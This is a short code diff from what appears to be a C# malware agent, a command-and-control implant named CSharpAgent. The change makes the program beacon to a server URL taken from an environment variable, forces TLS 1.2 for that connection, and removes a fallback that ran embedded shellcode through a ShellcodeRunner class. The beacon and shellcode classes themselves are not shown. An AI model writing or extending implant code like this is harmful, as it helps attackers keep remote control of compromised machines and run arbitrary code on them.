@@ -1,5 +1,6 @@
 using System;
 using System.Runtime.InteropServices;
+using System.Net;
 
 namespace CSharpAgent
 {
@@ -31,16 +32,18 @@ namespace CSharpAgent
 
         static void Main()
         {
-            var beaconUrl = Environment.GetEnvironmentVariable("H_URL");
-            if (!string.IsNullOrEmpty(beaconUrl))
+            try
             {
-                Beacon.Run(beaconUrl);
+                ServicePointManager.SecurityProtocol |= (SecurityProtocolType)3072;
+            }
+            catch { }
+
+            var beaconUrl = Environment.GetEnvironmentVariable("H_URL");
+            if (string.IsNullOrEmpty(beaconUrl))
+            {
                 return;
             }
-
-            var payload = C2Payload.Data;
-            if (payload.Length > 0)
-                ShellcodeRunner.RunPayload(payload);
+            Beacon.Run(beaconUrl);
         }
     }
 }
